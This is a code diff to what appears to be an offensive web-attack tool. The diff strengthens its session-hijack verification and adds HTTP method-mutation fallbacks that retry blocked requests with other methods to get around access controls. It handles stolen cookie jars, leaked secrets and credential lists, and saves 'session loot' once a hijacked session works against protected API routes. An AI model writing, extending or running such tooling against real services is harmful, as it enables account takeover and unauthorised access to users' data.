@@ -299,11 +299,25 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
 def verify_hijacked_session(transport):
     for endpoint in SESSION_VERIFICATION_ENDPOINTS:
         sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected API route: {endpoint}{RESET}\n")
+        
+        # Enhanced Header/Method Mutation fallback for verification
+        verified = False
         status, headers, body = transport.request("GET", endpoint)
         
-        is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or "<div id=\"__nuxt\"></div>" in body
+        is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or "<div id=\"__nuxt\"></div>" in body or len(body.strip()) < 350
+        
         if status == 200 and not is_spa_shell and len(body) > 10:
-            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
+            verified = True
+        else:
+            # Try method mutation (POST / OPTIONS) or alternative content type if standard GET fails
+            alt_status, alt_headers, alt_body = transport.request("POST", endpoint, payload={})
+            is_alt_spa = "<div id=\"root\"></div>" in alt_body or len(alt_body.strip()) < 350
+            if alt_status == 200 and not is_alt_spa and len(alt_body) > 10:
+                status, headers, body = alt_status, alt_headers, alt_body
+                verified = True
+
+        if verified:
+            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": status})
             success(f"[+] Session successfully verified against backend route: {endpoint}")
             
             save_session_loot(
@@ -357,7 +371,16 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
             continue
         executed_payloads.add(payload_key)
 
+        # Execute standard POST request
         status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
+        
+        # Adaptive Method/Header Fallback if 403/405 encountered
+        if status in [403, 405, 404]:
+            # Try GET or PUT mutation
+            alt_status, alt_headers, alt_body = transport.request("GET", endpoint)
+            if alt_status < 400:
+                status, headers, body = alt_status, alt_headers, alt_body
+
         if status == 0:
             continue
             
